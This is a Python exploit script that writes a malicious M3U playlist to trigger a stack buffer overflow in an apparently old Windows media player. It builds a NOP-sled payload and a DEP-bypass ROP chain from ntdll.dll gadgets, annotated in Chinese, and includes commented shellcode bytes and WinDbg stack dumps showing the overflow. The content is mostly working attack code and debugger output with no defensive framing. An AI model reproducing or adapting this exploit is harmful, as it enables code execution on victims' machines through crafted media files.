#!/usr/bin/env python
# -*- coding:utf-8 -*-
import codecs
import cStringIO
filename = 'rekt.m3u'

shellcode = ''
shellcode += u"\ue252\u7c92" #MOV EAX,1 RETN 地址
shellcode += u"\u8885\u5d1D" #修正 EBP
shellcode += u"\u4a19\u7c97" #增大 ESP
shellcode += u"\uc1B4\u7dC5" #jmp esp
shellcode += u"\uCD24\u7c93" #关闭 DEP 代码的起始位置
shellcode += u"\u33E9\uFFFF" #回跳指令
shellcode += u"\u90FF\u9090"

junk = "http://a"
buffer= u"\u9090\u9090" * ((0x0012ecdc - 0x0012ea98)/4 + 1)
payload = junk + buffer# + shellcode
data = codecs.open(filename,'w','UTF-16')
data.write(payload)
data.close()
print '[*] File created'
print '[*] With {} bytes'.format(len(payload))

# titleUni = titleHtml.decode(“UTF-8”, ‘ignore’);
# 0012ea88  00000000 00000000 00000000 00000000  <-eax
# 0012ea98
# 0012ecdc  0012ed6c 0088f09f 7fe90010 066bb35c  <-ebp
# Found:MOV EAX,0x1 RET at 0x7c92e252     Module:  C:\WINDOWS\system32\ntdll.dll
# Found:disable DEP at 0x7c93cd24     Module:  C:\WINDOWS\system32\ntdll.dll

#writer = csv.writer(openUCS-4test.txt', 'w', 'utf-8')
# f.write(content)

#  0x5D1D8B85 处的 PUSH ESP POP EBP RETN 04 指令来修正 EBP


# "……"
# "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
# "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
# "\x90\x90\x90\x90"
# "\x52\xE2\x92\x7C" //MOV EAX,1 RETN 地址
# "\x85\x8B\x1D\x5D" //修正 EBP
# "\x19\x4A\x97\x7C" //增大 ESP
# "\xB4\xC1\xC5\x7D" //jmp esp
# "\x24\xCD\x93\x7C" //关闭 DEP 代码的起始位置
# "\xE9\x33\xFF\xFF" //回跳指令
# "\xFF\x90\x90\x90"
# 
# 
0:000> dd 0012ea70
0012ea70  0012ecf0 00699791 0012ecdc 00b55bf8
0012ea80  0512efec 00000000 00740068 00700074
0012ea90  002f003a 0061002f 90909090 90909090
0012eaa0  90909090 90909090 90909090 90909090
0012eab0  90909090 90909090 90909090 90909090
0012eac0  90909090 90909090 90909090 90909090
0012ead0  90909090 90909090 90909090 90909090
0012eae0  90909090 90909090 90909090 90909090

0:000> dd esp
0012ea64  0012ea70 0069976e 0012ecdc 0012ecf0
0012ea74  00699791 0012ecdc 00b55bf8 0512efec
0012ea84  00000000 00740068 00700074 002f003a
0012ea94  0061002f 90909090 90909090 90909090
0012eaa4  90909090 90909090 90909090 90909090
0012eab4  90909090 90909090 90909090 90909090
0012eac4  90909090 90909090 90909090 90909090
0012ead4  90909090 90909090 90909090 90909090
